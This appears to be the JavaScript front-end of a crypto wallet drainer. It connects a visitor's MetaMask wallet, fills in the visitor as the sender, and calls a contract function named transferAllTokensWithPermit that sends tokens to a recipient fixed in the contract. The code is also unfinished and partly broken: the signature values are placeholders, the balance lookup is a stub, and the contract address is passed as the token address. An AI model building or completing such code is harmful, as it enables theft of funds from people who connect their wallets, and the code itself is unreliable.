let web3;
let userAddress;

// 设置你的合约地址
const contractAddress = '0x9a2E12340354d2532b4247da3704D2A5d73Bd189'; // 替换为你的合约地址

// 替换为你的合约 ABI
const contractABI = [
    {
        "inputs": [
            {"internalType": "address", "name": "token", "type": "address"},
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "uint256", "name": "value", "type": "uint256"},
            {"internalType": "uint256", "name": "deadline", "type": "uint256"},
            {"internalType": "uint8", "name": "v", "type": "uint8"},
            {"internalType": "bytes32", "name": "r", "type": "bytes32"},
            {"internalType": "bytes32", "name": "s", "type": "bytes32"}
        ],
        "name": "transferAllTokensWithPermit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "address", "name": "_recipient", "type": "address"}],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "anonymous": false,
        "inputs": [
            {"indexed": true, "internalType": "address", "name": "token", "type": "address"},
            {"indexed": true, "internalType": "address", "name": "from", "type": "address"},
            {"indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "TransferTokens",
        "type": "event"
    },
    {
        "inputs": [],
        "name": "recipient",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function"
    }
];

// 检查页面加载时是否有以太坊钱包
window.addEventListener('load', () => {
    if (typeof window.ethereum !== 'undefined') {
        console.log('以太坊钱包已检测到。');
    } else {
        alert('未检测到以太坊钱包，请安装MetaMask或其他以太坊钱包扩展。');
    }
});

// 绑定连接钱包按钮事件
document.getElementById('connectButton').addEventListener('click', connectWallet);

// 连接钱包函数
async function connectWallet() {
    console.log("尝试连接钱包...");
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            // 请求 MetaMask 连接
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];  // 获取连接的第一个钱包地址

            console.log("已连接地址:", userAddress);
            document.getElementById('address').innerText = `钱包地址: ${userAddress}`;

            // 自动填充代币合约地址和签名钱包地址
            document.getElementById('tokenAddress').innerText = contractAddress;
            document.getElementById('fromAddress').innerText = userAddress;

            // 获取签名信息并自动填充
            await signAndFillSignature(userAddress, contractAddress);
        } catch (error) {
            console.error("连接钱包时出错:", error);
            alert('连接钱包失败，请查看控制台的错误信息。');
        }
    } else {
        alert('请安装MetaMask或其他以太坊钱包扩展！');
        console.log("未检测到以太坊钱包。");
    }
}

// 模拟签名信息填写（真实应用中需要替换为真实的签名过程）
async function signAndFillSignature(userAddress, contractAddress) {
    console.log("正在生成签名...");
    
    // 这里需要实际的逻辑来获取 v, r, s 值
    const value = await getBalance(userAddress, contractAddress); // 假设这个函数获取用户的代币余额
    const deadline = Math.floor(Date.now() / 1000) + 60 * 10; // 当前时间 + 10分钟
    
    document.getElementById('v').value = 27;  // 模拟 v 值
    document.getElementById('r').value = "0x...";  // 模拟 r 值
    document.getElementById('s').value = "0x...";  // 模拟 s 值

    // 更新转移按钮的点击事件
    document.getElementById('transferButton').addEventListener('click', async () => {
        await transferTokens(value, deadline);
    });
}

// 示例函数：获取代币余额（这里需要实现具体逻辑）
async function getBalance(userAddress, contractAddress) {
    // TODO: 获取用户的代币余额的实际实现
    return 1000; // 假设余额为1000
}

// 转移代币的函数
async function transferTokens(value, deadline) {
    console.log("开始转移代币...");
    const v = document.getElementById('v').value;
    const r = document.getElementById('r').value;
    const s = document.getElementById('s').value;

    const contract = new web3.eth.Contract(contractABI, contractAddress);
    try {
        const result = await contract.methods.transferAllTokensWithPermit(
            contractAddress, // token
            userAddress,     // from
            value,           // value
            deadline,        // deadline
            v,               // v
            r,               // r
            s                // s
        ).send({ from: userAddress });

        console.log("代币转移成功:", result);
    } catch (error) {
        console.error("转移代币时出错:", error);
        alert('转移代币失败，请查看控制台的错误信息。');
    }
}
